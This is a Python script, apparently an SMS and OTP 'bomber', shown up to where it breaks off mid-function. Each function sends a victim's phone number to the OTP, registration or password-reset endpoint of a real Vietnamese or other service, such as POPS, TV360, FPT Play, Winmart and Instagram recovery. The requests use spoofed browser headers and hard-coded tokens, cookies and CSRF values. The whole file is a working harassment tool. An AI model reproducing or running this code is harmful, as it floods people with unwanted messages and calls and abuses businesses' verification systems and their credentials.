import os
try:
  import flask
except ImportError:
  os.system("pip install flask")
try:
  import requests
except ImportError:
  os.system("pip install requests")
from flask import Flask
from flask import request
import json
import requests
import random

tb = 0
tc = 0


def random_string(length):
  number = '0123456789'
  alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
  id = ''
  for i in range(0, length, 2):
    id += random.choice(number)
    id += random.choice(alpha)
  return id


def oldpops(phone):
  global tb, tc
  response = requests.post(
    "https://products.popsww.com/api/v5/auths/register",
    headers={
      "Host": "products.popsww.com",
      "content-length": "89",
      "profileid": "62e58a27c6f857005396318f",
      "sec-ch-ua-mobile": "?1",
      "authorization":
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw",
      "x-env": "production",
      "content-type": "application/json",
      "lang": "vi",
      "sub-api-version": "1.1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
      "api-key": "5d2300c2c69d24a09cf5b09b",
      "platform": "wap",
      "sec-ch-ua-platform": "\"Linux\"",
      "accept": "*/*",
      "origin": "https://pops.vn",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer":
      "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue",
      "accept-encoding": "gzip, deflate, br",
    },
    json=({
      "fullName": "",
      "account": phone,
      "password": "Vexx007",
      "confirmPassword": "Vexx007"
    }))
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def oldtv360(phone):
  global tb, tc
  response = requests.post(
    "http://m.tv360.vn/public/v1/auth/get-otp-login",
    headers={
      "Host": "m.tv360.vn",
      "Connection": "keep-alive",
      "Content-Length": "23",
      "Accept": "application/json, text/plain, */*",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "Origin": "http://m.tv360.vn",
      "Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F",
      "Accept-Encoding": "gzip, deflate"
    },
    json=({
      "msisdn": phone
    }))
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def oldloship(phone):
  global tb, tc
  response = requests.post(
    "https://mocha.lozi.vn/v6/invites/use-app",
    headers={
      "Host": "mocha.lozi.vn",
      "content-length": "47",
      "x-city-id": "50",
      "accept-language": "vi_VN",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
      "content-type": "application/json",
      "x-lozi-client": "1",
      "x-access-token": "unknown",
      "sec-ch-ua-platform": "\"Android\"",
      "accept": "*/*",
      "origin": "https://loship.vn",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://loship.vn",
      "accept-encoding": "gzip, deflate, br"
    },
    data=json.dumps({
      "device": "Android 8.1.0",
      "platform": "Chrome/104.0.0.0",
      "countryCode": "84",
      "phoneNumber": phone
    }))
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def oldalfrescos(phone):
  global tb, tc
  response = requests.post(
    "https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN",
    headers={
      "Host": "api.alfrescos.com.vn",
      "content-length": "124",
      "accept-language": "vi-VN",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json",
      "accept": "application/json, text/plain, */*",
      "brandcode": "ALFRESCOS",
      "devicecode": "web",
      "sec-ch-ua-platform": "\"Android\"",
      "origin": "https://alfrescos.com.vn",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://alfrescos.com.vn/",
      "accept-encoding": "gzip, deflate, br"
    },
    json=({
      "phoneNumber": phone,
      "secureHash": "add789229e0794d8508f948dacd710ae",
      "deviceId": "",
      "sendTime": 1660806807513,
      "type": 2
    }))
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def oldfptshop(phone):
  global tb, tc
  response = requests.post(
    "https://fptshop.com.vn/api-data/loyalty/Home/Verification",
    headers={
      "Host": "fptshop.com.vn",
      "content-length": "16",
      "accept": "*/*",
      "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
      "x-requested-with": "XMLHttpRequest",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "\"Linux\"",
      "origin": "https://fptshop.com.vn",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://fptshop.com.vn/",
      "accept-encoding": "gzip, deflate, br"
    },
    data={"phone": phone})
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def oldfacebook(phone):
  global tb, tc
  response = requests.post(
    "https://www.instagram.com/accounts/account_recovery_send_ajax/",
    data=f"email_or_username={phone}&recaptcha_challenge_field=",
    headers={
      "Content-Type": "application/x-www-form-urlencoded",
      "X-Requested-With": "XMLHttpRequest",
      "User-Agent":
      "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
      "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
    })
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def vieon(phone):
  global tb, tc
  Headers = {
    "Host":
    "api.vieon.vn",
    "content-length":
    "201",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/x-www-form-urlencoded",
    "sec-ch-ua-mobile":
    "?1",
    "authorization":
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4",
    "user-agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://vieon.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Params = {"platform": "mobile_web", "ui": "012021"}
  Payload = {
    "phone_number": phone,
    "password": "Vexx007",
    "given_name": "",
    "device_id": "7c775cd1cd49a31c3893ca1e09abbde3",
    "platform": "mobile_web",
    "model": "Android%2010",
    "push_token": "",
    "device_name": "Chrome%2F110",
    "device_type": "desktop",
    "ui": "012021"
  }
  response = requests.post("https://api.vieon.vn/backend/user/register/mobile",
                           params=Params,
                           data=Payload,
                           headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def vietid(phone):
  global tb, tc
  csrfget = requests.post(
    "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F"
  ).text
  csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
  Headers = {
    "Host": "oauth.vietid.net",
    "content-length": "41",
    "cache-control": "max-age\u003d0",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "upgrade-insecure-requests": "1",
    "origin": "https://oauth.vietid.net",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "accept":
    "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer":
    "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"
  }
  Payload = {"csrf-token": csrf, "account": phone}
  response = requests.post(
    "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F",
    data=Payload,
    headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def fptplay(phone):
  global tb, tc
  Headers = {
    "Host":
    "api.fptplay.net",
    "content-length":
    "89",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/json; charset\u003dUTF-8",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://fptplay.vn",
    "sec-fetch-site":
    "cross-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://fptplay.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "phone": phone,
    "country_code": "VN",
    "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
  })
  response = requests.post(
    "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1",
    data=Datason,
    headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def funring(phone):
  global tb, tc
  Headers = {
    "Host":
    "funring.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "28",
    "Accept":
    "*/*",
    "User-Agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "Content-Type":
    "application/json",
    "Origin":
    "http://funring.vn",
    "Referer":
    "http://funring.vn/module/register_mobile.jsp",
    "Accept-Encoding":
    "gzip, deflate",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
    "JSESSIONID\u003dNODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga\u003dGA1.2.1626827841.1679236846; _gid\u003dGA1.2.888694467.1679236846; _gat\u003d1"
  }
  Datason = json.dumps({"username": phone})
  response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",
                           data=Datason,
                           headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def gotadi(phone):
  global tb, tc
  Headers = {
    "Host":
    "api.gotadi.com",
    "content-length":
    "44",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"",
    "accept":
    "application/json",
    "sec-ch-ua-platform":
    "\"Android\"",
    "gtd-client-tracking-device-id":
    "85519cab-85d7-4881-abfa-65d2a2bb3a52",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "content-type":
    "application/json",
    "origin":
    "https://www.gotadi.com",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://www.gotadi.com/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({"phoneNumber": phone, "language": "VI"})
  response = requests.post(
    "https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp",
    data=Datason,
    headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def winmart(phone):
  global tb, tc
  response = requests.get(
    f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}")
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def moneydong(phone):
  global tb, tc
  Headers = {
    "Host":
    "api.moneydong.vip",
    "content-length":
    "72",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/x-www-form-urlencoded",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://h5.moneydong.vip",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://h5.moneydong.vip/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Payload = {
    "phone": phone,
    "type": "2",
    "ctype": "1",
    "chntoken": "69ad075c94c279e43608c5d50b77e8b9"
  }
  response = requests.post(
    "https://api.moneydong.vip/h5/LoginMessage_ultimate",
    data=Payload,
    headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def daihocfpt(phone):
  global tb, tc
  response = requests.get(
    f"https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile={phone}"
  )
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def cafeland(phone):
  global tb, tc
  Headers = {
    "Host":
    "nhadat.cafeland.vn",
    "content-length":
    "65",
    "accept":
    "application/json, text/javascript, */*; q\u003d0.01",
    "content-type":
    "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "x-requested-with":
    "XMLHttpRequest",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://nhadat.cafeland.vn",
    "sec-fetch-site":
    "same-origin",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://nhadat.cafeland.vn/dang-ky.html",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie":
    "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"
  }
  Payload = {
    "mobile": phone,
    "_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",
  }
  response = requests.post("https://nhadat.cafeland.vn/member-send-otp/",
                           data=Payload,
                           headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def oldvayvnd(phone):
  global tb, tc
  response = requests.post(
    "https://api.vayvnd.vn/v1/users/password-reset",
    headers={
      "Host": "api.vayvnd.vn",
      "content-length": "22",
      "accept": "application/json",
      "content-type": "application/json",
      "accept-language": "vi",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "\"Android\"",
      "origin": "https://vayvnd.vn",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://vayvnd.vn/",
      "accept-encoding": "gzip, deflate, br"
    },
    data=json.dumps({"login": phone}))
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def oldtamo(phone):
  global tb, tc
  response = requests.post(
    "https://api.tamo.vn/web/public/client/phone/sms-code-ts",
    headers={
      "Host": "api.tamo.vn",
      "content-length": "39",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json;charset\u003dUTF-8",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "\"Linux\"",
      "origin": "https://www.tamo.vn",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://www.tamo.vn/",
      "accept-encoding": "gzip, deflate, br"
    },
    json=({
      "mobilePhone": {
        "number": phone
      }
    }))
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def atmonline(phone):
  global tb, tc
  Headers = {
    "Host": "atmonline.com.vn",
    "content-length": "46",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "authorization": "",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://atmonline.com.vn",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer":
    "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"
  }
  Datason = json.dumps({"mobilePhone": phone, "source": "ONLINE"})
  response = requests.post(
    "https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",
    data=Datason,
    headers=Headers)
  if response.status_code == 200:
    tc = tc + 1
  else:
    tb = tb + 1


def call1(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
